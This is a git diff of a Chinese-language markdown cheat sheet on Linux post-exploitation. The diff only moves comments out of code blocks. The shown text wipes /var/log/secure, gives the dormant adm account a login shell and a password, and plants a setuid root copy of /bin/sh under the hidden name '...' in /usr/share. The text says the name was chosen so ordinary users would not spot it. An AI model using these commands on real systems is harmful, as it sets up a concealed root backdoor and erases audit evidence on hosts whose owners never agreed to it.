@@ -26,17 +26,17 @@ cat /dev/null > /var/log/secure
 ```
 
 #### 三、suid提权
+- 激活adm用户（linux自带很多无用用户，如adm，mail）
 ```shell
-激活adm用户（linux自带很多无用用户，如adm，mail）
 usermod -s /bin/bash adm
 echo "password"|passwd --stdin adm
-
-suid提权，把sh复制重命名为...，放在其他文件夹，加s权限，重命名为...是为了不被发现,ls看不到，ls -la一般人也看不出
+```
+- suid提权，把sh复制重命名为...，放在其他文件夹，加s权限，重命名为...是为了不被发现,ls看不到，ls -la一般人也看不出
+```shell
 cp /bin/sh /usr/share/...
 chmod a+s /usr/share/...
-
-使用时以adm ssh登录，然后./usr/share/...就是root权限了
 ```
+- 使用时以adm ssh登录，然后./usr/share/...就是root权限了
 
 
 
